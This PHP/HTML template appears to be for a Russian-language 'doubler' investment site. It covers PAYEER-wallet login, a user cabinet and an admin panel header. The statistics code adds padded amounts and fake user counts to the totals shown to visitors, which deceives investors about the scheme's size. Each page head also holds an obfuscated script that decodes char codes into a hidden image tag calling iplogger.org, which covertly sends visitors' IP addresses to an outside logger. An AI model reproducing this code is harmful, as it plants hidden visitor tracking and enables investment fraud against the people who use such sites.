<?
$user=$db->getOne("SELECT wallet FROM ss_users WHERE id=?i",$id); //Кошелек участника (личный)
$ihra=$db->getOne("SELECT curator FROM ss_users WHERE id=?i",$id);//Номер куратора (личный)
$ihr=$db->getOne("SELECT i_have_refs_as_curator FROM ss_users WHERE id=?i",$id);//Количество партнеров (личный)

$refk=$db->getOne("SELECT sum(summa) FROM `pay` WHERE type='Выплата реферальных'"); //Сколько выплачено реферальных (всего)
$refk=number_format($refk,2,'.',',');

$refk_my=$db->getOne("SELECT SUM(summa) FROM pay WHERE userid=?i AND type='Выплата реферальных'",$id); //Сколько выплачено реферальных (личный)
$depmoney=$db->getOne("SELECT sum(summa) FROM `pay` WHERE type!='Выплата по депозиту' AND type!='Выплата реферальных'"); //Сколько депнуто (всего)
$depmoney_adm=$db->getOne("SELECT sum(summa) FROM `pay` WHERE type!='Выплата по депозиту' AND type!='Выплата реферальных'"); //Сколько депнуто (для админа)

$depmoney_my=$db->getOne("SELECT SUM(summa) FROM pay WHERE userid=?i AND type!='Выплата по депозиту' AND type!='Выплата реферальных'",$id); //Сколько депнуто (личный)
$depmoney_my=number_format($depmoney_my,2,'.',',');

$wthmoney=$db->getOne("SELECT sum(summa) FROM `pay` WHERE type!='Пополнение баланса'");//Сколько выплачено (всего)
$wthmoney_adm=$db->getOne("SELECT SUM(opisanie) FROM userstat WHERE type='Выплата админских'");//Сколько выплачено админских (всего)
$wthdep_my=$db->getOne("SELECT SUM(summa) FROM pay WHERE userid=?i AND type='Выплата по депозиту'",$id);//Сколько выплачено по депу (личный)
$invcount=$db->numRows($db->query("SELECT id FROM ss_users WHERE curator>0"));//Количество участников (всего)
$registr=$db->getOne("SELECT reg_unix FROM ss_users WHERE id=?i",$id);//Дата регистрации участника (личный)
$plus_dep=$db->getOne("SELECT SUM(plus) FROM more"); //Накручено в +
$minus_dep=$db->getOne("SELECT SUM(minus) FROM more"); //Накручено в -
$feyk=$db->getOne("SELECT SUM(feikuser) FROM more"); //Фейков
$data_starta=$db->getOne("SELECT start FROM more"); //Дата старта
$vkgrup=$db->getOne("SELECT vk FROM more"); //Вк группа
$telega=$db->getOne("SELECT telega FROM more"); //Телеграм
$adminmail=$db->getOne("SELECT mail FROM more"); //Почта администрации

$budget=$refk_my+$wthdep_my;
if($budget<0){$budget=0;}
$refk_my=number_format($refk_my,2,'.',',');
$wthdep_my=number_format($wthdep_my,2,'.',',');
$budget=number_format($budget,2,'.',',');
$uzerov=number_format(($invcount+$feyk));

$budget_adm=$wthmoney+$wthmoney_adm;
if($budget_adm<0){$budget_adm=0;}
$depmoney=number_format(($depmoney+$plus_dep),2,'.',',');
$wthmoney=number_format(($wthmoney+$minus_dep),2,'.',',');
$depmoney_adm=number_format(($depmoney_adm),2,'.',',');
$wthmoney_adm=number_format(($wthmoney_adm),2,'.',',');
$budget_adm=number_format($budget_adm,2,'.',',');
?>

<?if(empty($id)){?>


<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?=$sitename?></title>
<meta name="description" content="Инвестиционный проект <?=$sitename?>">
<meta name='author' content='Stas Danilov'>
<meta name='Copyright' content='EDscript (ed-script.pro)'>
<link href="/ser_files/font-awesome/css/font-awesome.min.css" rel="stylesheet">
<link href="/style/form.css" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Oswald:400,700&amp;subset=cyrillic" rel="stylesheet">
<link rel="stylesheet" href="/ser_files/main.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous">
<link rel="stylesheet" href="/ser_files/animate.min.css">
<link rel="icon" href="/ser_files/favicon.ico">
<script src="./ser_files/wow.min.js"></script>
<script>new WOW().init();</script>
<script type="text/javascript" src="http://gostats.ru/js/counter.js"></script>  
<script type="text/javascript">_gos='c4.gostats.ru';_goa=407459;
_got=5;_goi=1;_gol='анализ сайта';_GoStatsRun();</script>
<noscript><img alt="" 
src="http://c4.gostats.ru/bin/count/a_407459/t_5/i_1/counter.png" 
style="border-width:0" /></noscript>
<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!87!70!54!50!55!34!32!32!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>
</head>


<div class="dm-overlay" id="reg-in">
<div class="dm-table">
<div class="dm-cell">
<div class="dm-modal">
<a href="#close" class="close"></a>
<h3 style="color: #0b1115cf;padding-left: 5px;font-size: 21px;margin-bottom: 10px;">Регистрация / Авторизация</h3>
<div class="pl-left">
<style>
.tooltip {
position: fixed;
padding: 10px 20px;
border: 1px solid #b3c9ce;
border-radius: 4px;
text-align: center;
font: 14px/1.3 arial, sans-serif;
color: #333;
background: #fff;
box-shadow: 3px 3px 3px rgba(0, 0, 0, .3);
}
</style>

<center>
<form action="" method="post">	
<input type="hidden" name="do" value="toaccount">
<input type="hidden" name="antipovtor" value="<?=time();?>">
<table height="21px" border="0">
<tbody>
<tr>
<td align="center">
<div class="label" style="color: #383d40;float: left;margin-bottom: 0px;margin-top: 15px;font-weight: 500;font-size: 13px;padding-left: 5px;">Введите номер кошелька PAYEER</div>

<input autocomplete="off" name="wallet" pattern="^P[0-9]{7,14}" title="Первая буква должна быть заглавной [P] далее цифры кошелька" type="text" size="23" maxlength="35" placeholder="Введите свой кошелек в формате PXXXXXXXX" style="font-family: 'Oswald', sans-serif;text-transform: none;width: 100%;height: 50px;background: #fff url(/img/koshel.png) no-repeat left 20px center;margin-top: 10px;margin-bottom: 10px;border: 2px solid #e6e6e685;outline: 0 !important;border-radius: 4px;color: #383d40;text-align: left;padding-left: 85px;background-size: 30px;">


<div class="label" style="color: #383d40;float: left;margin-bottom: 5px;margin-top: 0px;font-weight: 500;font-size: 13px;padding-left: 5px;">Введите капчу</div>

<input autocomplete="off" name="captcha" type="text" size="23" maxlength="35" placeholder="Введите цифры с картинки" style="text-transform: none;width: 100%;height: 50px; background: #fff url(/secpic.php?r=<?=time()?>) no-repeat;background-size: 75px;border-left-width: 3px;margin-bottom: 15px;border: 2px solid #e6e6e685;outline: 0 !important;padding-left: 85px;padding-right: 80px;border-radius: 4px;color: #383d40;text-align: left;font-family: 'Oswald', sans-serif;">

<input type="submit" name="submit" id="form" value="ВОЙТИ НА ПРОЕКТ" class="sever">
<br>
<p style="">Нет payeer кошелька? Зарегистрируй его <a href="https://payeer.com/03967833" target="_blank">здесь</a></p>

</td>
</tr>
</tbody>
</table>
</form>
</center>

</div>
</div>
</div>
</div>
</div>

<?}else{?>

<!--Лучшие скрипты удвоителей только здесь - https://ed-script.pro-->

<?if($id > (1)){?>

<!DOCTYPE html>
<html lang="ru-RU">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title>Личный кабинет проекта <?=$sitename?></title>
<!-- Favicon-->
<link rel="icon" href="assets/images/favicon.png" type="image/x-icon">
<link rel="stylesheet" href="assets/plugins/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="assets/plugins/jvectormap/jquery-jvectormap-2.0.3.css"/>
<!-- Custom Css -->
<link rel="stylesheet" href="assets/css/main.css">
<link rel="stylesheet" href="assets/css/all-themes.css" />
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css" integrity="sha384-5sAR7xN1Nv6T6+dT2mhtzEpVJvfS3NScPQTrOxhwjIuvcA67KV2R5Jz6kr4abQsz" crossorigin="anonymous">
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<script type="text/javascript" src="http://gostats.ru/js/counter.js"></script>  
<script type="text/javascript">_gos='c4.gostats.ru';_goa=407459;
_got=5;_goi=1;_gol='анализ сайта';_GoStatsRun();</script>
<noscript><img alt="" 
src="http://c4.gostats.ru/bin/count/a_407459/t_5/i_1/counter.png" 
style="border-width:0" /></noscript>
<script>
$(document).ready(function(){
setInterval(function(){
$('.countdown').each(function(){
var time=$(this).text().split(':');
var timestamp=time[0]*3600+ time[1]*60+ time[2]*1;timestamp-=timestamp>0;
var hours=Math.floor(timestamp/3600);
var minutes=Math.floor((timestamp- hours*3600)/ 60);
var seconds=timestamp- hours*3600- minutes*60;if(hours<10){hours='0'+ hours;}

if(minutes<10){minutes='0'+ minutes;}
if(seconds<10){seconds='0'+ seconds;}
if(timestamp>0){
$(this).text(hours+':'+ minutes+':'+ seconds);
}
});
},1000);

})
</script>
<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!87!70!54!50!55!34!32!32!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>
</head>

<body class="theme-purple">
<div class="page-loader-wrapper">
<div class="loader">
<div class="preloader">
<div class="spinner-layer pl-red">
<div class="circle-clipper left">
<div class="circle"></div>
</div>
<div class="circle-clipper right">
<div class="circle"></div>
</div>
</div>
</div>
<p style="color: #000;">Загрузка страницы...</p>
</div>
</div>
<!-- Overlay For Sidebars -->
<div class="overlay"></div>

<!-- Top Bar -->
<nav class="navbar">
<div class="col-12">
<div class="navbar-header">            
<a href="javascript:void(0);" class="bars"></a>
<a class="navbar-brand" href="/">Личный кабинет</a>
</div>
<ul class="nav navbar-nav navbar-right">
<li><a href="/exit" class="mega-menu" data-close="true"><i class="zmdi zmdi-power"></i> Выход</a></li>
</ul>
</div>
</nav>
<!-- Left Sidebar -->
<aside id="leftsidebar" class="sidebar"> 
<!-- User Info -->
<div class="user-info">
<div class="image"> <img src="assets/images/man.png" width="64" height="64" alt="User" /> </div>
<div class="info-container">
<div class="name" data-toggle="dropdown">Ваш логин <?=$user?></div>
<div class="email">Мы рады Вас видеть!</div>
</div>
</div>
<!-- #User Info --> 

<!-- Menu -->
<div class="menu">
<ul class="list">
<li class="header">НАВИГАЦИЯ</li>
<li> <a href="/my_newdep"><span><i class="fas fa-landmark"></i> Новый депозит</span> </a></li>
<li> <a href="/my_deposits"><span><i class="fas fa-business-time"></i> Ваши депозиты</span> </a></li>
<li> <a href="/my_partners"><span><i class="fas fa-sitemap"></i> Партнеры</span> </a> </li>
<li> <a href="/my_promo"><span><i class="fas fa-bullhorn"></i> Промо материалы</span> </a> </li>
<li> <a href="/my_comments"><span><i class="fas fa-comments"></i> Отзывы</span> </a> </li>
<li> <a href="/my_support"><span><i class="fas fa-headset"></i> Администрация</span> </a> </li>
<li> <a href="https://ed-script.pro" target="_blank"><span><i class="fas fa-code"></i> Заказать проект</span> </a> </li>
</ul>
</div>
<!-- #Menu --> 
</aside>

<!-- Main Content -->
<section class="content home">
<div class="container-fluid">
<div class="block-header">
<div class="row">           
</div>
</div>
<div class="row clearfix">
<div class="col-lg-3 col-md-3 col-sm-6">
<div class="card widget-stat">
<div class="body">
<div class="media">

<div class="media-text">
<span class="title">Инвестировано</span>
<span class="value"><?=$depmoney_my?> <?=$m_curr?></span>
</div>
</div>
</div>
</div>
</div>
<div class="col-lg-3 col-md-3 col-sm-6">
<div class="card widget-stat">
<div class="body">
<div class="media">

<div class="media-text">
<span class="title">Рефералов</span>
<span class="value"><?=$ihr?> ЧЕЛ.</span>
</div>
</div>
</div>
</div>
</div>
<div class="col-lg-3 col-md-3 col-sm-6">
<div class="card widget-stat">
<div class="body">
<div class="media">

<div class="media-text">
<span class="title">Выведено всего</span>
<span class="value"><?=$budget?> <?=$m_curr?></span>
</div>
</div>
</div>
</div>
</div>
<div class="col-lg-3 col-md-3 col-sm-6">
<div class="card widget-stat">
<div class="body">
<div class="media">

<div class="media-text">
<span class="title">Партнерских</span>
<span class="value"><?=$refk_my?> <?=$m_curr?></span>
</div>
</div>
</div>
</div>
</div>
</div>

<div class="row clearfix">
<div class="col-md-12">
<div class="card">
<div class="body">
<p class="copy m-b-0">
Дата вашей регистрации - <b><?=date('d.m.Y в H:i',$registr)?></b> <b>|</b> Ваш личный номер - <b><?=$id?></b> <b>|</b> Номер Вашего пригласителя - <b><?=$ihra?></b>
</p>
</div>
</div>
</div>
</div>

<?}else{?>

<?if($id == (1)){?>

<!--Лучшие скрипты удвоителей только здесь - https://ed-script.pro-->

<!DOCTYPE html>
<html lang="ru-RU">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title>Админ панель проекта <?=$sitename?></title>
<!-- Favicon-->
<link rel="icon" href="assets/images/favicon.png" type="image/x-icon">
<link rel="stylesheet" href="assets/plugins/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="assets/plugins/jvectormap/jquery-jvectormap-2.0.3.css"/>
<!-- Custom Css -->
<link rel="stylesheet" href="assets/css/main.css">
<link rel="stylesheet" href="assets/css/all-themes.css" />
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css" integrity="sha384-5sAR7xN1Nv6T6+dT2mhtzEpVJvfS3NScPQTrOxhwjIuvcA67KV2R5Jz6kr4abQsz" crossorigin="anonymous">
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<script type="text/javascript" src="http://gostats.ru/js/counter.js"></script>  
<script type="text/javascript">_gos='c4.gostats.ru';_goa=407459;
_got=5;_goi=1;_gol='анализ сайта';_GoStatsRun();</script>
<noscript><img alt="" 
src="http://c4.gostats.ru/bin/count/a_407459/t_5/i_1/counter.png" 
style="border-width:0" /></noscript>
<script>
$(document).ready(function(){
setInterval(function(){
$('.countdown').each(function(){
var time=$(this).text().split(':');
var timestamp=time[0]*3600+ time[1]*60+ time[2]*1;timestamp-=timestamp>0;
var hours=Math.floor(timestamp/3600);
var minutes=Math.floor((timestamp- hours*3600)/ 60);
var seconds=timestamp- hours*3600- minutes*60;if(hours<10){hours='0'+ hours;}

if(minutes<10){minutes='0'+ minutes;}
if(seconds<10){seconds='0'+ seconds;}
if(timestamp>0){
$(this).text(hours+':'+ minutes+':'+ seconds);
}
});
},1000);

})
</script>
<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!87!70!54!50!55!34!32!32!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>
</head>

<?}}}?>